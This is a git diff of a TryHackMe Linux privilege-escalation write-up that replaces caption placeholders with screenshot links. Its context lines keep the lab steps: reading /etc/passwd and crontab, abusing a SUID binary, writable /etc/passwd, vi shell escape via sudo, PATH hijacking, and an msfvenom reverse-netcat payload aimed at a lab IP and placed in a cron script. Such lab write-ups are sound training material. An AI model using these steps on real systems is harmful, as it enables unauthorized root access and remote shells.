@@ -31,7 +31,7 @@ Just realized we were supposed to answers these questions using `linenum`. So af
    uname -a
    ```
 
-   ENUM USERS
+   ![Enum Hostname](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/commonlinuxprivesc/Common_Linux_Privesc_Enum_Hostname.png)
 
    ><details><summary>Click for answer</summary>polobox</details>
 
@@ -43,7 +43,7 @@ Just realized we were supposed to answers these questions using `linenum`. So af
    cat /etc/passwd | grep user
    ```
 
-   ENUM USERS
+   ![Enum Users](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/commonlinuxprivesc/Common_Linux_Privesc_Enum_Users.png)
 
    ><details><summary>Click for answer</summary>8</details>
 
@@ -55,7 +55,7 @@ Just realized we were supposed to answers these questions using `linenum`. So af
    cat /etc/shells
    ```
 
-   ENUM SHELLS
+   ![Enum Shells](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/commonlinuxprivesc/Common_Linux_Privesc_Enum_Shells.png)
 
    ><details><summary>Click for answer</summary>4</details>
 
@@ -67,7 +67,7 @@ Just realized we were supposed to answers these questions using `linenum`. So af
    cat /etc/crontab
    ```
 
-   ENUM CRON
+   ![Enum Cron](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/commonlinuxprivesc/Common_Linux_Privesc_Enum_Cron.png)
 
    ><details><summary>Click for answer</summary>autoscript.sh</details>
 
@@ -79,7 +79,7 @@ Just realized we were supposed to answers these questions using `linenum`. So af
    find /etc -maxdepth 1 -perm -g+w
    ```
 
-   ENUM WRITE
+   ![Enum Write](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/commonlinuxprivesc/Common_Linux_Privesc_Enum_Write.png)
 
    ><details><summary>Click for answer</summary>/etc/passwd</details>
 
@@ -91,11 +91,11 @@ Just realized we were supposed to answers these questions using `linenum`. So af
 
    Looking at the SUID files from linenum, we can see which file has the suid bit set in user3's directory.
 
-   SUID FILE
+   ![Suid File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/commonlinuxprivesc/Common_Linux_Privesc_Suid_File.png)
 
    Running it we can indeed see we are now root.
 
-   SUID ROOT
+   ![Suid Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/commonlinuxprivesc/Common_Linux_Privesc_Suid_Root.png)
 
    ><details><summary>Click for answer</summary>/home/user3/shell</details>
 
@@ -121,7 +121,7 @@ Just realized we were supposed to answers these questions using `linenum`. So af
    openssl passwd -1 -salt new 123
    ```
 
-   PASSWD HASH
+   ![Passwd Hash](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/commonlinuxprivesc/Common_Linux_Privesc_Passwd_Hash.png)
 
    ><details><summary>Click for answer</summary>$1$new$p7ptkEKU1HnaHpRtzNizS1</details>
 
@@ -142,7 +142,7 @@ Just realized we were supposed to answers these questions using `linenum`. So af
 
 6. Now, use"su"to login as the "new" account, and then enter the password. If you've done everything correctly- you should be greeted by a root prompt! Congratulations!
 
-   PASSWD ROOT
+   ![Passwd Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/commonlinuxprivesc/Common_Linux_Privesc_Passwd_Root.png)
 
 ### Escaping Vi Editor
 
@@ -152,7 +152,7 @@ Just realized we were supposed to answers these questions using `linenum`. So af
 
    After switching to user8 we run `sudo -l` to see what they can run with sudo.
 
-   VI SUDO
+   ![Vi Sudo](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/commonlinuxprivesc/Common_Linux_Privesc_Vi_Sudo.png)
 
    ><details><summary>Click for answer</summary>NOPASSWD</details>
 
@@ -160,7 +160,7 @@ Just realized we were supposed to answers these questions using `linenum`. So af
 
 4. Now, type":!sh"to open a shell!
 
-   VI SHELL
+   ![Vi Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/commonlinuxprivesc/Common_Linux_Privesc_Vi_Shell.png)
 
 ### Exploiting Crontab
 
@@ -194,15 +194,15 @@ Just realized we were supposed to answers these questions using `linenum`. So af
    msfvenom -p cmd/unix/reverse_netcat lhost=10.18.78.136 lport=1337 -f raw
    ```
 
-   CRONTAB PAYLOAD
+   ![Crontab Payload](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/commonlinuxprivesc/Common_Linux_Privesc_Crontab_Payload.png)
 
    Now we can add this line to the script on the target machine.
 
-   CRONTAB SCRIPT
+   ![Crontab Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/commonlinuxprivesc/Common_Linux_Privesc_Crontab_Script.png)
 
    Now we must set-up a netcat listener on our attackbox and we should receive a connection within five minutes.
 
-   CRONTAB SHELL
+   ![Crontab Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/commonlinuxprivesc/Common_Linux_Privesc_Crontab_Shell.png)
 
 ### Exploiting PATH Variable
 
@@ -212,7 +212,7 @@ Just realized we were supposed to answers these questions using `linenum`. So af
 
    After navigating to the script and running it with `./script` we see a list of files and folders. This probably means it uses the `ls` command.
 
-   PATH SCRIPT
+   ![Path Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/commonlinuxprivesc/Common_Linux_Privesc_Path_Script.png)
 
    ><details><summary>Click for answer</summary>ls</details>
 
@@ -249,8 +249,8 @@ A4. Now we're inside tmp, let's create an imitation executable. The format for w
    export PATH=/tmp:$PATH
    ```
 
-   PATH MODIFY
+   ![Path Modify](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/commonlinuxprivesc/Common_Linux_Privesc_Path_Modify.png)
 
    Now all we need to do is run the script from the home folder to get a root shell.
 
-   PATH SHELL
+   ![Path Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/commonlinuxprivesc/Common_Linux_Privesc_Path_Shell.png)
